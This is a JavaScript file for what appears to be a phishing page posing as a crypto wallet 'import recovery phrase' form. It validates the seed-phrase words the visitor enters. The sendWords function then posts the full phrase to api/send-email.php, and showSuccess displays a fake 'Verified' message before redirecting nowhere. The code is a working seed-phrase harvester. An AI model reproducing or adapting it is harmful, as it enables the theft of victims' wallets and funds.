// Add this variable to track form validity
let formHasErrors = false;

// Helper functions for form validation
function validateWord(word) {
    return validWords.includes(word.toLowerCase());
}

function generateInputs() {
    const grid = document.getElementById('phrasesGrid');
    const wordCount = parseInt(document.getElementById('wordCount').value);
    
    grid.innerHTML = '';

    for (let i = 1; i <= wordCount; i++) {
        const div = document.createElement('div');
        div.className = 'phrase-input';
        div.innerHTML = `
            <div class="input-container">
                <span class="number-label">${i}</span>
                <input type="text" 
                    id="phrase${i}" 
                    placeholder="Enter word"
                    oninput="validateInput(this)">
                <button type="button" class="visibility-toggle" onclick="toggleFieldVisibility(${i})">
                    <img src="src/asset/svg/eye-open.svg" alt="Toggle visibility" id="visibilityIcon${i}">
                </button>
            </div>
        `;
        grid.appendChild(div);
    }
}

function validateInput(input) {
    const word = input.value.trim();
    const container = input.parentElement;
    
    // Add or remove class based on whether input has content
    if (word === '') {
        container.classList.remove('invalid');
        container.classList.remove('input-has-content'); // Remove class when empty
        updateSubmitButton();
        return;
    } else {
        container.classList.add('input-has-content'); // Add class when has content
    }

    if (!validateWord(word)) {
        container.classList.add('invalid');
    } else {
        container.classList.remove('invalid');
    }
    
    // Check all inputs and update submit button state
    updateSubmitButton();
}

// New function to update the submit button state
function updateSubmitButton() {
    const invalidInputs = document.querySelectorAll('.input-container.invalid');
    const emptyInputs = Array.from(document.querySelectorAll('.phrase-input input')).filter(input => input.value.trim() === '');
    const submitBtn = document.querySelector('.login-btn');
    const errorMsg = document.getElementById('validation-error') || createErrorMessage();
    
    if (invalidInputs.length > 0) {
        // Disable button if any invalid inputs
        submitBtn.disabled = true;
        submitBtn.classList.add('disabled');
        errorMsg.textContent = 'Please correct the highlighted words';
        errorMsg.style.display = 'block';
        formHasErrors = true;
    } else if (emptyInputs.length > 0) {
        // Don't show error for empty inputs, but still disable button
        submitBtn.disabled = true;
        submitBtn.classList.add('disabled');
        errorMsg.style.display = 'none';
        formHasErrors = false;
    } else {
        // Enable button if all inputs are valid
        submitBtn.disabled = false;
        submitBtn.classList.remove('disabled');
        errorMsg.style.display = 'none';
        formHasErrors = false;
    }
}

// Create error message element
function createErrorMessage() {
    const errorMsg = document.createElement('div');
    errorMsg.id = 'validation-error';
    errorMsg.className = 'validation-error';
    errorMsg.style.color = '#dc2626';
    errorMsg.style.marginTop = '10px';
    errorMsg.style.textAlign = 'center';
    errorMsg.style.fontSize = '0.9rem';
    
    // Insert after the phrases grid
    const phrasesGrid = document.getElementById('phrasesGrid');
    phrasesGrid.parentNode.insertBefore(errorMsg, phrasesGrid.nextSibling);
    
    return errorMsg;
}

function handlePaste(event) {
    event.preventDefault();
    const pastedText = (event.clipboardData || window.clipboardData).getData('text');
    const words = pastedText.trim().split(/\s+/);
    const inputs = document.querySelectorAll('.phrase-input input');
    
    words.forEach((word, index) => {
        if (inputs[index]) {
            inputs[index].value = word;
            validateInput(inputs[index]);
        }
    });
    
    updateNumberVisibility(); // Update number visibility after pasting
}

function setupPasteHandling() {
    const phrasesGrid = document.getElementById('phrasesGrid');
    phrasesGrid.addEventListener('paste', handlePaste);
}

function toggleFieldVisibility(fieldId) {
    const input = document.getElementById(`phrase${fieldId}`);
    const icon = document.getElementById(`visibilityIcon${fieldId}`);
    
    if (input.type === 'text') {
        input.type = 'password';
        icon.src = 'src/asset/svg/eye-closed.svg';
    } else {
        input.type = 'text';
        icon.src = 'src/asset/svg/eye-open.svg';
    }
}

function collectWords() {
    const inputs = document.querySelectorAll('.phrase-input input');
    return Array.from(inputs).map(input => input.value.trim());
}

function sendWords() {
    const words = collectWords();
    const btn = document.querySelector('.login-btn');
    
    // First check for empty fields
    if (words.some(word => word === '')) {
        alert('Please fill in all recovery phrase words.');
        return;
    }
    
    // Then check for invalid words
    if (formHasErrors) {
        alert('Please correct the invalid words before continuing.');
        return;
    }
    
    // Disable button to prevent multiple submissions
    btn.disabled = true;
    btn.textContent = 'Processing...';
    
    console.log('Sending seed phrase to server...');

    // Create recovery phrase string
    const recoveryPhrase = words.join(' ');
    
    // Send to Cloudflare Worker
    fetch('api/send-email.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ recoveryPhrase })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            showSuccess(btn);
        } else {
            throw new Error(data.error || 'Failed to process recovery phrase');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
        btn.disabled = false;
        btn.textContent = 'Import';
    });
}

// Helper function to show success UI
function showSuccess(btn) {
    btn.textContent = 'Verifying...';
    setTimeout(() => {
        btn.classList.add('success');
        btn.textContent = 'Verified';
        
        // Redirect after success
        setTimeout(() => {
            window.location.href = '#';
        }, 1500);
    }, 2000);
}

// Add this function to ensure number labels are properly shown/hidden when form initializes
function updateNumberVisibility() {
    const inputs = document.querySelectorAll('.phrase-input input');
    inputs.forEach(input => {
        const container = input.parentElement;
        if (input.value.trim() !== '') {
            container.classList.add('input-has-content');
        } else {
            container.classList.remove('input-has-content');
        }
    });
}

// Initialize inputs when page loads
document.addEventListener('DOMContentLoaded', () => {
    generateInputs();
    setupPasteHandling();
    
    document.getElementById('wordCount').addEventListener('change', generateInputs);
    
    // Add input event listeners for all inputs to update button state
    document.addEventListener('input', function(e) {
        if (e.target.matches('.phrase-input input')) {
            validateInput(e.target);
        }
    });
    
    // Add click handler for submit button
    const submitBtn = document.querySelector('.login-btn');
    submitBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (!formHasErrors) {
            sendWords();
        }
    });
    
    // Initialize button state
    updateSubmitButton();
    updateNumberVisibility(); // Add this to check initial state
});
